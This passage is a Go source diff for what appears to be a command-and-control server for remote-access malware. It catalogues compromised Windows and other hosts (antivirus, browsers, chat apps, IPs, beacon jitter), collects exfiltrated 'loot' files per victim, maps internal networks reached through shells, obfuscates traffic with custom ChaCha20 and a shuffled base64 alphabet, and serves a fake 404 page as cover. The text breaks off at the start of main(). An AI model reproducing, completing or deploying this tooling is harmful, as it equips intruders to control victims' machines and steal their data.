+		username, uid, realFilename, splitPos, startPos, endPos)
+	logger.WriteLog(fileLog2)
+
+	// 最后一块完成
+	if endPos == filePos {
+		loot := updateLoot(uid, realFilename)
+		if loot != nil {
+			PushWS("", "updateLoot",
+				map[string]interface{}{
+					"uid":  uid,
+					"data": loot,
+				},
+			)
+		}
+		time.Sleep(3 * time.Second)
+		filelog3 := fmt.Sprintf(log_word["request_file_finish"], username, uid, realFilename, filePos, receivedFilePath)
+		logger.WriteLog(filelog3)
+	}
+}
+
+func getFilenameFromPath(path string) string {
+	// 查找最后一个斜杠的位置，可以是 / 或 \
+	lastSlash := strings.LastIndexAny(path, "/\\")
+	if lastSlash == -1 {
+		// 如果没有斜杠，直接返回原路径作为文件名
+		return path
+	}
+	// 返回斜杠后面的部分作为文件名
+	return path[lastSlash+1:]
+}
+
+type LogEntry struct {
+	Time    string `json:"time"`
+	Message string `json:"message"`
+}
+
+// 读取日志，返回结构体切片
+func Log_read(maxLines int) []LogEntry {
+	if maxLines <= 0 {
+		return []LogEntry{}
+	}
+	chunks, ok := func() ([][]byte, bool) {
+		loggerMu.RLock()
+		defer loggerMu.RUnlock()
+		file, err := os.Open("server.log")
+		if err != nil {
+			return nil, false
+		}
+		defer file.Close()
+		info, err := file.Stat()
+		if err != nil {
+			return nil, false
+		}
+		const blockSize int64 = 4096
+		pos := info.Size()
+		newline := 0
+		chunks := make([][]byte, 0)
+		for pos > 0 && newline <= maxLines {
+			size := blockSize
+			if pos < size {
+				size = pos
+			}
+			pos -= size
+			tmp := make([]byte, size)
+			n, err := file.ReadAt(tmp, pos)
+			if err != nil && err != io.EOF {
+				return nil, false
+			}
+			if n == 0 {
+				break
+			}
+			tmp = tmp[:n]
+			chunks = append(chunks, tmp)
+			newline += bytes.Count(tmp, []byte{'\n'})
+		}
+		return chunks, true
+	}()
+	if !ok {
+		return nil
+	}
+	totalSize := 0
+	for _, chunk := range chunks {
+		totalSize += len(chunk)
+	}
+	buffer := make([]byte, 0, totalSize)
+	for i := len(chunks) - 1; i >= 0; i-- {
+		buffer = append(buffer, chunks[i]...)
+	}
+	lines := bytes.Split(buffer, []byte{'\n'})
+	if len(lines) > 0 && len(lines[len(lines)-1]) == 0 {
+		lines = lines[:len(lines)-1]
+	}
+	if len(lines) > maxLines {
+		lines = lines[len(lines)-maxLines:]
+	}
+	entries := make([]LogEntry, 0, len(lines))
+	for _, line := range lines {
+		if len(line) == 0 {
+			continue
+		}
+		var entry LogEntry
+		if err := json.Unmarshal(line, &entry); err == nil {
+			entries = append(entries, entry)
+		}
+	}
+	return entries
+}
+
+// 日志记录器
+type MyLog struct{}
+
+func (w *MyLog) WriteLog(logStr string) {
+	entry := LogEntry{
+		Time:    time.Now().Format("2006-01-02 15:04:05"),
+		Message: logStr,
+	}
+	data, err := json.Marshal(entry)
+	if err != nil {
+		fmt.Println("marshal log error:", err)
+		return
+	}
+	err = func() error {
+		loggerMu.Lock()
+		defer loggerMu.Unlock()
+		file, err := os.OpenFile(
+			"server.log",
+			os.O_CREATE|os.O_WRONLY|os.O_APPEND,
+			0666,
+		)
+		if err != nil {
+			return fmt.Errorf("open log file: %w", err)
+		}
+		if _, err := file.Write(append(data, '\n')); err != nil {
+			_ = file.Close()
+			return fmt.Errorf("write log file: %w", err)
+		}
+		if err := file.Close(); err != nil {
+			return fmt.Errorf("close log file: %w", err)
+		}
+
+		return nil
+	}()
+	if err != nil {
+		fmt.Println("log error:", err)
+		return
+	}
+	PushWS("", "updatelog", map[string]interface{}{
+		"code": "200",
+		"data": []LogEntry{entry},
+	})
+}
+
+type LootFile struct {
+	Name    string  `json:"name"`
+	SizeKB  float64 `json:"size_kb"`
+	ModTime string  `json:"mod_time"`
+}
+type LootClient struct {
+	UID   string     `json:"uid"`
+	Host  string     `json:"host"`
+	Files []LootFile `json:"files"`
+}
+
+func Get_loots_pro() []LootClient {
+	clientMap := make(map[string]string)
+
+	clientDataMu.RLock()
+	for i := range client_data.Clients {
+		c := &client_data.Clients[i]
+		clientMap[c.Uid] = c.Host
+	}
+	clientDataMu.RUnlock()
+
+	windows_clientMu.RLock()
+	for i := range windows_client_data.Clients {
+		c := &windows_client_data.Clients[i]
+		clientMap[c.Uid] = c.Host
+	}
+	windows_clientMu.RUnlock()
+
+	result := make([]LootClient, 0)
+	if len(clientMap) == 0 {
+		return result
+	}
+	for uid, host := range clientMap {
+		if !isSafeLootPathPart(uid) {
+			continue
+		}
+		dirPath := filepath.Join("uploads", uid)
+		files, err := os.ReadDir(dirPath)
+		if err != nil {
+			continue
+		}
+		loot := LootClient{
+			UID:   uid,
+			Host:  host,
+			Files: make([]LootFile, 0),
+		}
+		for _, file := range files {
+			if file.IsDir() {
+				continue
+			}
+			fileName := file.Name()
+			if !isSafeLootPathPart(fileName) {
+				continue
+			}
+			fullPath := filepath.Join(dirPath, fileName)
+			info, err := os.Stat(fullPath)
+			if err != nil || info.IsDir() {
+				continue
+			}
+			sizeKB := math.Round((float64(info.Size())/1024)*100) / 100
+			loot.Files = append(loot.Files, LootFile{
+				Name:    fileName,
+				SizeKB:  sizeKB,
+				ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
+			})
+		}
+		result = append(result, loot)
+	}
+	return result
+}
+
+func isSafeLootPathPart(value string) bool {
+	value = strings.TrimSpace(value)
+	return value != "" &&
+		value != "." &&
+		value != ".." &&
+		filepath.VolumeName(value) == "" &&
+		filepath.Base(value) == value &&
+		!strings.ContainsAny(value, `/\`)
+}
+
+func updateLoot(uid, filename string) *LootClient {
+	uid = strings.TrimSpace(uid)
+	filename = strings.TrimSpace(filename)
+
+	if !isSafeLootPathPart(uid) || !isSafeLootPathPart(filename) {
+		return nil
+	}
+
+	loot := &LootClient{
+		UID:   uid,
+		Host:  "",
+		Files: make([]LootFile, 0, 1),
+	}
+
+	clientDataMu.RLock()
+	for i := range client_data.Clients {
+		client := &client_data.Clients[i]
+		if client.Uid == uid {
+			loot.Host = client.Host
+			break
+		}
+	}
+	clientDataMu.RUnlock()
+
+	if loot.Host == "" {
+		windows_clientMu.RLock()
+		for i := range windows_client_data.Clients {
+			client := &windows_client_data.Clients[i]
+			if client.Uid == uid {
+				loot.Host = client.Host
+				break
+			}
+		}
+		windows_clientMu.RUnlock()
+	}
+
+	filePath := filepath.Join("uploads", uid, filename)
+
+	info, err := os.Stat(filePath)
+	if err != nil || info.IsDir() {
+		return nil
+	}
+	sizeKB := math.Round((float64(info.Size())/1024)*100) / 100
+	loot.Files = append(loot.Files, LootFile{
+		Name:    filename,
+		SizeKB:  sizeKB,
+		ModTime: info.ModTime().Format("2006-01-02 15:04:05"),
+	})
+
+	return loot
+}
+
+// 前端上传文件
+func UserUploadFile(uid, filename, splitSize string, file io.Reader) error {
+	var logStr string
+	if dotIndex := strings.Index(splitSize, "."); dotIndex != -1 {
+		splitSize = splitSize[:dotIndex]
+	}
+
+	splitPos, err := strconv.Atoi(splitSize)
+	if err != nil || splitPos <= 0 {
+		splitPos = 1048576
+	}
+
+	tmpFile, err := os.CreateTemp("", "upload-*")
+	if err != nil {
+		logStr = fmt.Sprintf(log_word["tmp_file"], uid, err)
+		logger.WriteLog(logStr)
+		return err
+	}
+	defer os.Remove(tmpFile.Name())
+	defer tmpFile.Close()
+
+	written, err := io.Copy(tmpFile, file)
+	if err != nil {
+		logStr = fmt.Sprintf(log_word["write_tmp"], uid, err)
+		logger.WriteLog(logStr)
+		return err
+	}
+
+	if _, err := tmpFile.Seek(0, io.SeekStart); err != nil {
+		logStr = fmt.Sprintf(log_word["read_tmp"], uid, err)
+		logger.WriteLog(logStr)
+		return err
+	}
+
+	fileContent, err := io.ReadAll(tmpFile)
+	if err != nil {
+		logStr = fmt.Sprintf(log_word["read_tmp"], uid, err)
+		logger.WriteLog(logStr)
+		return err
+	}
+
+	keyData, err := json.Marshal(uploadFileKey{
+		UID:       uid,
+		Filename:  filename,
+		SplitSize: splitPos,
+	})
+	if err != nil {
+		logStr = fmt.Sprintf(log_word["write_tmp"], uid, err)
+		logger.WriteLog(logStr)
+		return err
+	}
+	fileKey := string(keyData)
+
+	DoByteMu.Lock()
+	DownloadFile_byte_parts[fileKey] = fileContent
+	DoByteMu.Unlock()
+
+	logStr = fmt.Sprintf(
+		log_word["upload_tmp"],
+		uid,
+		written,
+		filename,
+	)
+	logger.WriteLog(logStr)
+
+	return nil
+}
+
+func ClearUnmarkedGlobalVars() {
+	// 1) 清理 msgQueues
+	queuesMu.Lock()
+	msgQueues = make(map[string]*uidMsgQueue)
+	queuesMu.Unlock()
+
+	// 2) 清理 交换密钥
+	mlkemKeysMu.Lock()
+	for uid, pair := range mlkemKeys {
+		clear(pair.private)
+		clear(pair.public)
+		delete(mlkemKeys, uid)
+	}
+	mlkemKeysMu.Unlock()
+
+	// 3) 清理 msgFileQueue
+	fileMu.Lock()
+	msgFileQueue = make(map[string]*fileQueue)
+	fileMu.Unlock()
+
+	// 4) 清理 msgResultQueues
+	resultMu.Lock()
+	msgResultQueues = make(map[string]*resultQueue)
+	resultMu.Unlock()
+
+	// 5) 清理 msg_map_list
+	mapMu.Lock()
+	msg_map_list = make([]Msg_result, 0)
+	mapMu.Unlock()
+
+	// 6) 清理 msg_file_cache
+	fcache.Lock()
+	msg_file_cache = make([]Msg_file, 0)
+	fcache.Unlock()
+
+	// 7) 清理下载缓存
+	DoByteMu.Lock()
+	DownloadFile_byte_parts = make(map[string][]byte)
+	parts_count = make(map[string]int)
+	DoByteMu.Unlock()
+
+	// 8) 清理全局 sessionSlice
+	mutex.Lock()
+	sessionSlice = make([]string, 0)
+	mutex.Unlock()
+
+	// 9) 清理内网资产
+	dataInnetmu.Lock()
+	data_innet.Innets = nil
+	dataInnetmu.Unlock()
+
+	// 10) 清理websocket连接
+	wsUsersMu.Lock()
+	clientsToClose := make([]*WSClient, 0)
+	seen := make(map[*WSClient]struct{})
+
+	for _, clients := range wsUsers {
+		for _, c := range clients {
+			if c == nil {
+				continue
+			}
+			if _, exists := seen[c]; exists {
+				continue
+			}
+
+			seen[c] = struct{}{}
+			clientsToClose = append(clientsToClose, c)
+		}
+	}
+
+	wsUsers = make(map[string][]*WSClient)
+	wsUsersMu.Unlock()
+
+	for _, c := range clientsToClose {
+		_ = c.Close()
+	}
+
+	// 11) 写日志（这里可以直接写，不影响锁）
+	logStr := log_word["Memory_clean"]
+	logger.WriteLog(logStr)
+}
+
+// 查询内网资产
+func getInnet(uid string) []Innet {
+	listInnet := make([]Innet, 0)
+	dataInnetmu.RLock()
+	defer dataInnetmu.RUnlock()
+	for i := range data_innet.Innets {
+		innet := &data_innet.Innets[i]
+		if uid == innet.Uid {
+			listInnet = append(listInnet, *innet)
+		}
+	}
+	return listInnet
+}
+func updateInnet(uid string) Innet {
+	dataInnetmu.RLock()
+	defer dataInnetmu.RUnlock()
+
+	for i := len(data_innet.Innets) - 1; i >= 0; i-- {
+		innet := &data_innet.Innets[i]
+		if innet.Uid == uid {
+			return *innet
+		}
+	}
+	return Innet{}
+}
+
+func rotl(x uint32, n uint) uint32 {
+	return (x << n) | (x >> (32 - n))
+}
+
+func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {
+	a += b
+	d ^= a
+	d = rotl(d, 16)
+
+	c += d
+	b ^= c
+	b = rotl(b, 12)
+
+	a += b
+	d ^= a
+	d = rotl(d, 8)
+
+	c += d
+	b ^= c
+	b = rotl(b, 7)
+
+	return a, b, c, d
+}
+
+func initializeState(key [32]byte, counter uint32, nonce [12]byte) [16]uint32 {
+	return [16]uint32{
+		0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+		binary.LittleEndian.Uint32(key[0:4]),
+		binary.LittleEndian.Uint32(key[4:8]),
+		binary.LittleEndian.Uint32(key[8:12]),
+		binary.LittleEndian.Uint32(key[12:16]),
+		binary.LittleEndian.Uint32(key[16:20]),
+		binary.LittleEndian.Uint32(key[20:24]),
+		binary.LittleEndian.Uint32(key[24:28]),
+		binary.LittleEndian.Uint32(key[28:32]),
+		counter,
+		binary.LittleEndian.Uint32(nonce[0:4]),
+		binary.LittleEndian.Uint32(nonce[4:8]),
+		binary.LittleEndian.Uint32(nonce[8:12]),
+	}
+}
+
+func chacha20Block(key [32]byte, counter uint32, nonce [12]byte) [64]byte {
+	state := initializeState(key, counter, nonce)
+	working := state
+
+	for i := 0; i < 10; i++ {
+		working[0], working[4], working[8], working[12] = quarterRound(working[0], working[4], working[8], working[12])
+		working[1], working[5], working[9], working[13] = quarterRound(working[1], working[5], working[9], working[13])
+		working[2], working[6], working[10], working[14] = quarterRound(working[2], working[6], working[10], working[14])
+		working[3], working[7], working[11], working[15] = quarterRound(working[3], working[7], working[11], working[15])
+
+		working[0], working[5], working[10], working[15] = quarterRound(working[0], working[5], working[10], working[15])
+		working[1], working[6], working[11], working[12] = quarterRound(working[1], working[6], working[11], working[12])
+		working[2], working[7], working[8], working[13] = quarterRound(working[2], working[7], working[8], working[13])
+		working[3], working[4], working[9], working[14] = quarterRound(working[3], working[4], working[9], working[14])
+	}
+
+	var out [64]byte
+	for i := 0; i < 16; i++ {
+		working[i] += state[i]
+		binary.LittleEndian.PutUint32(out[i*4:], working[i])
+	}
+
+	return out
+}
+
+func ChaCha20Encrypt(data []byte, key [32]byte, nonce [12]byte, counter uint32) []byte {
+	out := make([]byte, len(data))
+
+	for i := 0; i < len(data); i += 64 {
+		block := chacha20Block(key, counter, nonce)
+		n := len(data) - i
+		if n > 64 {
+			n = 64
+		}
+
+		for j := 0; j < n; j++ {
+			out[i+j] = data[i+j] ^ block[j]
+		}
+
+		counter++
+	}
+
+	return out
+}
+
+func Encrypt(input []byte, key []byte) []byte {
+	if len(key) != 32 {
+		return nil
+	}
+
+	var chaKey [32]byte
+	copy(chaKey[:], key)
+
+	var nonce [12]byte
+	if _, err := crand.Read(nonce[:]); err != nil {
+		return nil
+	}
+
+	cipher := ChaCha20Encrypt(input, chaKey, nonce, 0)
+
+	out := make([]byte, 12+len(cipher))
+	copy(out[:12], nonce[:])
+	copy(out[12:], cipher)
+
+	return out
+}
+
+func Decrypt(input []byte, key []byte) []byte {
+	if len(key) != 32 || len(input) < 12 {
+		return nil
+	}
+
+	var chaKey [32]byte
+	copy(chaKey[:], key)
+
+	var nonce [12]byte
+	copy(nonce[:], input[:12])
+
+	cipher := input[12:]
+	return ChaCha20Encrypt(cipher, chaKey, nonce, 0)
+}
+
+// 字符串解密
+func Get_decry_s(input *string, key *[]byte, decodeMap map[byte]int) string {
+	data := customBase64Decode(*input, decodeMap)
+	return string(Decrypt(data, *key))
+}
+
+// 字符串加密
+func Get_encry_s(input *string, key *[]byte, base_rounds *string) string {
+	return customBase64Encode(
+		Encrypt(
+			[]byte(*input),
+			*key),
+		*base_rounds,
+	)
+}
+
+func generateRandomBase64Table() string {
+	charset := []byte("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")
+	for i := len(charset) - 1; i > 0; i-- {
+		n, err := crand.Int(crand.Reader, big.NewInt(int64(i+1)))
+		if err != nil {
+			return ""
+		}
+		j := int(n.Int64())
+		charset[i], charset[j] = charset[j], charset[i]
+	}
+	return string(charset)
+}
+
+func isValidBase64Table(value string) bool {
+	const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+	if len(value) != len(alphabet) {
+		return false
+	}
+
+	var allowed [256]bool
+	for i := 0; i < len(alphabet); i++ {
+		allowed[alphabet[i]] = true
+	}
+
+	var seen [256]bool
+	for i := 0; i < len(value); i++ {
+		char := value[i]
+		if !allowed[char] || seen[char] {
+			return false
+		}
+		seen[char] = true
+	}
+	return true
+}
+
+func buildDecodeMap(base_rounds string) map[byte]int {
+	m := make(map[byte]int)
+	for i := 0; i < len(base_rounds); i++ {
+		m[base_rounds[i]] = i
+	}
+	return m
+}
+
+// 编码函数（无 padding）
+func customBase64Encode(data []byte, base_rounds string) string {
+	var buf bytes.Buffer
+	length := len(data)
+	for i := 0; i < length; i += 3 {
+		remain := length - i
+		var b1, b2, b3 byte
+		b1 = data[i]
+		if remain > 1 {
+			b2 = data[i+1]
+		}
+		if remain > 2 {
+			b3 = data[i+2]
+		}
+		val := uint32(b1)<<16 | uint32(b2)<<8 | uint32(b3)
+		outCount := 4
+		if remain == 1 {
+			outCount = 2
+		} else if remain == 2 {
+			outCount = 3
+		}
+		for j := 0; j < outCount; j++ {
+			index := (val >> uint(18-6*j)) & 0x3F
+			buf.WriteByte(base_rounds[index])
+		}
+	}
+	return buf.String()
+}
+
+// 解码函数（无 padding）
+func customBase64Decode(s string, decodeMap map[byte]int) ([]byte) {
+	var (
+		val  uint32
+		valb int
+	)
+	out := make([]byte, 0, len(s))
+	for i := 0; i < len(s); i++ {
+		v, ok := decodeMap[s[i]]
+		if !ok {
+			continue
+		}
+		val = (val << 6) | uint32(v)
+		valb += 6
+		if valb >= 8 {
+			valb -= 8
+			out = append(out, byte((val>>valb)&0xFF))
+		}
+	}
+	return out
+}
+
+/*结构体数据部分*/
+//server插件结构体
+type Plugin struct {
+	Remark        string   `json:"remark"`
+	CodeWord      string   `json:"codeWord"`
+	Code          string   `json:"code"`
+	OS            string   `json:"os"`
+	Parameter     []string `json:"parameter"`
+	ParameterDesc []string `json:"parameter_desc"`
+}
+type ServerPlugin struct {
+	Plugins []Plugin `json:"servers"`
+}
+
+var server_plugin ServerPlugin
+var serverPluginMu sync.RWMutex
+
+// server结构体
+type Server struct {
+	Port         string `json:"port"`
+	Path         string `json:"path"`
+	ConnPath     string `json:"conn_path"`
+	MsgPath      string `json:"msg_path"`
+	SwitchPath   string `json:"switch_path"`
+	DownloadPath string `json:"download_path"`
+	ResultPath   string `json:"result_path"`
+	NetPath      string `json:"net_path"`
+	InfoPath     string `json:"info_path"`
+	UploadPath   string `json:"upload_path"`
+	ListPath     string `json:"list_path"`
+	OptionPath   string `json:"option_path"`
+	Protocol     string `json:"protocol"`
+	CertPath     string `json:"certPath"`
+	KeyPath      string `json:"keyPath"`
+	// Clients    int    `json:"clients"`
+	Username     string `json:"username"`
+	Remark       string `json:"remark"`
+	Uid          string `json:"uid"`
+	Hostname     string `json:"hostname"`
+	KeyPart      string `json:"keyPart"`
+	Filekey      string `json:"filekey"`
+	WindowsPro   string `json:"windows_pro"`
+	BaseRounds   string `json:"base_rounds"`
+	ResponseHead string `json:"response_head"`
+}
+type Server_data struct {
+	Servers []Server `json:"servers"`
+}
+
+var server_data Server_data
+var serverDataMu sync.RWMutex
+
+// 用户结构体
+type User struct {
+	Username string `json:"username"`
+	Password string `json:"password"`
+}
+type Data_user struct {
+	Users []User `json:"users"`
+}
+
+var data_user Data_user
+
+// 主机结构体
+type Client struct {
+	Username   string `json:"username"`
+	Host       string `json:"host"`
+	OS         string `json:"os"`
+	Delay      int    `json:"Delay"`
+	Jitter     int    `json:"jitter"`
+	Executable string `json:"executable"`
+	OnlineTime string `json:"online_time"`
+	ExternalIP string `json:"external_ip"`
+	LocalIP    string `json:"local_ip"`
+	CurrentDir string `json:"currentDir"`
+	version    string `json:"version"`
+	Remarks    string `json:"Remarks"`
+	checkTime  string `json:"checkTime"`
+	Uid        string `json:"uid"`
+	Server     string `json:"server"`
+	Proto      string `json:"proto"`
+}
+type Data struct {
+	Clients []Client `json:"clients"`
+}
+
+var client_data Data
+var clientDataMu sync.RWMutex
+
+// 主机结构体 - Windows专属扩展版本
+type WindowsClient struct {
+	Username   string `json:"username"`
+	Host       string `json:"host"`
+	OS         string `json:"os"`
+	Delay      int    `json:"delay"`
+	Jitter     int    `json:"jitter"`
+	Executable string `json:"executable"`
+	OnlineTime string `json:"online_time"`
+	ExternalIP string `json:"external_ip"`
+	LocalIP    string `json:"local_ip"`
+	CurrentDir string `json:"currentDir"`
+	Version    string `json:"version"`
+	Remarks    string `json:"remarks"`
+	CheckTime  string `json:"checkTime"`
+	Uid        string `json:"uid"`
+	Server     string `json:"server"`
+	Proto      string `json:"proto"`
+	// Windows 专属字段
+	MacAddresses string `json:"mac_addresses"` // MAC地址
+	CPUInfo      string `json:"cpu_info"`      // CPU信息
+	Antivirus    string `json:"antivirus"`     // 杀毒软件
+	Browsers     string `json:"browsers"`      // 浏览器信息
+	ChatApps     string `json:"chat_apps"`     // 聊天应用
+	MemoryInfo   string `json:"memory_info"`   // 内存使用情况
+	SystemType   string `json:"system_type"`   // 系统类型
+	Architecture string `json:"architecture"`  // 架构信息
+}
+type WindowsData struct {
+	Clients []WindowsClient `json:"clients"`
+}
+
+// 全局 Windows 客户端数据
+var windows_client_data WindowsData
+var windows_clientMu sync.RWMutex
+
+// get_conn结构体
+type getConn struct {
+	Host       string `json:"host"`
+	OnlineTime string `json:"online_time"`
+	ShellIP    string `json:"shell_ip"`
+	Uid        string `json:"uid"`
+}
+type Data_conn struct {
+	Conns []getConn `json:"conns"`
+}
+
+var data_conn Data_conn
+var dataConnMu sync.RWMutex
+
+// 内网资产结构体
+type Innet struct {
+	Uid        string   `json:"Uid"`
+	Target     string   `json:"target"`
+	ShellInnet []string `json:"shell_innet"`
+}
+
+type DataInnet struct {
+	Innets []Innet `json:"innets"`
+}
+
+var data_innet DataInnet
+var dataInnetmu sync.RWMutex
+
+// 操作人员聊天结构体
+type Chat struct {
+	Username string `json:"username"`
+	Message  string `json:"message"`
+	Time     string `json:"time"`
+	Chatid   string `json:"chatid"`
+	Type     string `json:"type"`
+}
+type Data_chat struct {
+	Chats []Chat `json:"chats"`
+}
+
+var data_chat Data_chat
+var dataChatmu sync.RWMutex
+
+type uploadFileKey struct {
+	UID      string `json:"uid"`
+	Filename string `json:"filename"`
+	SplitSize int    `json:"split_size"`
+}
+
+func put_innet(uid, target string, shell_innet []string) {
+
+	newInnet := Innet{
+		Uid:        uid,
+		Target:     target,
+		ShellInnet: append([]string(nil), shell_innet...),
+	}
+
+	changed := false
+	dataInnetmu.Lock()
+	for i := range data_innet.Innets {
+		innet := &data_innet.Innets[i]
+		if uid == innet.Uid && target == innet.Target {
+			data_innet.Innets = append(data_innet.Innets[:i], data_innet.Innets[i+1:]...)
+			data_innet.Innets = append(data_innet.Innets, newInnet)
+			changed = true
+			break
+		}
+	}
+	if !changed {
+		data_innet.Innets = append(data_innet.Innets, newInnet)
+		changed = true
+	}
+	dataInnetmu.Unlock()
+
+	if changed {
+		go PushAgentData(uid, "updateGetMsgNet")
+	}
+}
+
+// 写入链接结构体
+func put_conn(host, online_time, uid, shell_ip string) {
+	dataConnMu.Lock()
+	newConn := getConn{
+		Host:       host,
+		OnlineTime: online_time,
+		ShellIP:    shell_ip,
+		Uid:        uid,
+	}
+	for i := range data_conn.Conns {
+		conn := &data_conn.Conns[i]
+		if uid == conn.Uid {
+			dataConnMu.Unlock()
+			return
+		}
+	}
+	data_conn.Conns = append(data_conn.Conns, newConn)
+	dataConnMu.Unlock()
+
+	go PushAgentData(uid, "updateListen")
+
+	log_str := fmt.Sprintf(log_word["request_host"], shell_ip, host, uid)
+	logger.WriteLog(log_str)
+}
+
+type MyServer struct{}
+
+func (s *MyServer) PutServer(
+	port, path, connPath, msgPath, switch_key, download, result, net, info,
+	upload, list, option, protocol, remark string,
+	certPEM, keyPEM, uid, hostname, keyPart, filekey, windows_pro, base_rounds, resphead, username string,
+) bool {
+	if remark == "" {
+		remark = port + protocol
+	}
+
+	serverDataMu.Lock()
+	for i := range server_data.Servers {
+		server := &server_data.Servers[i]
+		if server.Port == port || server.Remark == remark {
+			serverDataMu.Unlock()
+			log.Printf("Server with port %v and remark %v already exists.\n", port, remark)
+			return false
+		}
+	}
+	newServer := Server{
+		Port:         port,
+		Path:         path,
+		ConnPath:     connPath,
+		MsgPath:      msgPath,
+		SwitchPath:   switch_key,
+		DownloadPath: download,
+		ResultPath:   result,
+		NetPath:      net,
+		InfoPath:     info,
+		UploadPath:   upload,
+		ListPath:     list,
+		OptionPath:   option,
+		Protocol:     protocol,
+		CertPath:     certPEM,
+		KeyPath:      keyPEM,
+		// Clients:  clients,
+		Username:     username,
+		Remark:       remark,
+		Uid:          uid,
+		Hostname:     hostname,
+		KeyPart:      keyPart,
+		Filekey:      filekey,
+		WindowsPro:   windows_pro,
+		BaseRounds:   base_rounds,
+		ResponseHead: resphead,
+	}
+
+	server_data.Servers = append(server_data.Servers, newServer)
+	serverDataMu.Unlock()
+
+	go PushAgentData(port, "updateServer")
+
+	return true
+}
+
+// Windows 专属的写入主机结构体函数
+func Windows_put_client(username, host, osType, online_time, shell_ip, currentDir, version, innet_ip, remarks, uid, server_remark, executable string, _delay, jitter int, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch, proto string) {
+	windows_clientMu.Lock()
+	defer windows_clientMu.Unlock()
+	newClient := WindowsClient{
+		Username:   username,
+		Host:       host,
+		OS:         osType,
+		Delay:      _delay,
+		OnlineTime: online_time,
+		ExternalIP: shell_ip,
+		LocalIP:    innet_ip,
+		CurrentDir: currentDir,
+		Version:    version,
+		Remarks:    remarks,
+		Uid:        uid,
+		Server:     server_remark,
+		Jitter:     jitter,
+		Executable: executable,
+		Proto:      proto,
+		// Windows 专属字段
+		MacAddresses: macs,
+		CPUInfo:      cpuInfo,
+		Antivirus:    antivirus,
+		Browsers:     browsers,
+		ChatApps:     chatApps,
+		MemoryInfo:   memoryStr,
+		SystemType:   systemType,
+		Architecture: arch,
+	}
+
+	for i := range windows_client_data.Clients {
+		client := &windows_client_data.Clients[i]
+		if username == client.Username && host == client.Host && uid == client.Uid {
+			client.OnlineTime = online_time
+			client.ExternalIP = shell_ip
+			client.LocalIP = innet_ip
+			client.Delay = _delay
+			client.CurrentDir = currentDir
+			client.Version = version
+			client.Remarks = remarks
+			client.CheckTime = online_time
+			client.Server = server_remark
+			client.Jitter = jitter
+			client.Executable = executable
+			client.Proto = proto
+
+			// 更新 Windows 专属字段
+			client.MacAddresses = macs
+			client.CPUInfo = cpuInfo
+			client.Antivirus = antivirus
+			client.Browsers = browsers
+			client.ChatApps = chatApps
+			client.MemoryInfo = memoryStr
+			client.SystemType = systemType
+			client.Architecture = arch
+
+			go PushAgentData(uid, "updateWinIndex")
+
+			return
+		}
+	}
+	// 如果不存在，则添加新客户端
+	windows_client_data.Clients = append(windows_client_data.Clients, newClient)
+
+	go PushAgentData(uid, "updateWinIndex")
+
+}
+
+// 写入主机结构体
+func put_client(username, host, osType, online_time, shell_ip, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, proto string, _delay, jitter int) {
+	clientDataMu.Lock()
+	defer clientDataMu.Unlock()
+	newClient := Client{
+		Username:   username,
+		Host:       host,
+		OS:         osType,
+		Delay:      _delay,
+		OnlineTime: online_time,
+		ExternalIP: shell_ip,
+		LocalIP:    innet_ip,
+		CurrentDir: currentDir,
+		version:    version,
+		Remarks:    Remarks,
+		Uid:        uid,
+		Server:     server_remark,
+		Jitter:     jitter,
+		Executable: executable,
+		Proto:      proto,
+	}
+	for i := range client_data.Clients {
+		client := &client_data.Clients[i]
+		if username == client.Username && host == client.Host && uid == client.Uid {
+			client.OnlineTime = online_time
+			client.ExternalIP = shell_ip
+			client.LocalIP = innet_ip
+			client.Delay = _delay
+			client.CurrentDir = currentDir
+			client.version = version
+			client.Remarks = Remarks
+			client.checkTime = online_time
+			client.Server = server_remark
+			client.Jitter = jitter
+			client.Executable = executable
+			client.Proto = proto
+
+			go PushAgentData(uid, "updateIndex")
+
+			return
+		}
+	}
+	client_data.Clients = append(client_data.Clients, newClient)
+
+	go PushAgentData(uid, "updateIndex")
+
+}
+
+// 读取结构体
+func readJSONFile(fileName string, v interface{}) error {
+	file, err := os.OpenFile(fileName, os.O_RDWR|os.O_CREATE, 0644)
+	if err != nil {
+		return fmt.Errorf("could not open file: %v", err)
+	}
+	defer file.Close()
+	byteValue, err := io.ReadAll(file)
+	if err != nil {
+		return fmt.Errorf("Failed to read file content: %v", err)
+	}
+	if len(byteValue) > 0 {
+		err = json.Unmarshal(byteValue, v)
+		if err != nil {
+			return fmt.Errorf("Failed to parse JSON data: %v", err)
+		}
+	}
+	return nil
+}
+
+/*结构体数据部分结束*/
+
+type ServerConfig struct {
+	Port            string            `json:"port"`
+	CertPath        string            `json:"cert"`
+	KeyPath         string            `json:"key"`
+	DefaultCert     bool              `json:"default_cert"`
+	RespError       string            `json:"resp_error"`
+	CSSFile         string            `json:"css"`
+	LoginFile       string            `json:"login_file"`
+	Title           string            `json:"title"`
+	UIRoute         string            `json:"ui_route"`
+	WebRoute        string            `json:"web_route"`
+	LoginRoute      string            `json:"login_route"`
+	JSRoute         string            `json:"js_route"`
+	CSSRoute        string            `json:"css_route"`
+	NotFoundHeaders map[string]string `json:"not_found_headers"`
+}
+
+func defaultConfig() ServerConfig {
+	return ServerConfig{
+		Port:            "443",
+		RespError:       "404 page not found",
+		Title:           "connect",
+		UIRoute:         "server",
+		WebRoute:        "user_index",
+		LoginRoute:      "login",
+		JSRoute:         "lain.js",
+		CSSRoute:        "lain.css",
+		NotFoundHeaders: map[string]string{},
+	}
+}
+
+func ensureConfig(path string) (ServerConfig, error) {
+	cfg := defaultConfig()
+
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		data, err := json.MarshalIndent(cfg, "", "  ")
+		if err != nil {
+			return cfg, err
+		}
+		if err := os.WriteFile(path, append(data, '\n'), 0644); err != nil {
+			return cfg, err
+		}
+		return cfg, nil
+	} else if err != nil {
+		return cfg, err
+	}
+
+	f, err := os.Open(path)
+	if err != nil {
+		return cfg, err
+	}
+	defer f.Close()
+
+	if err := json.NewDecoder(f).Decode(&cfg); err != nil {
+		fmt.Printf("[*] config parse failed, using defaults: %v\n", err)
+		return defaultConfig(), nil
+	}
+	return cfg, nil
+}
+
+func main() {
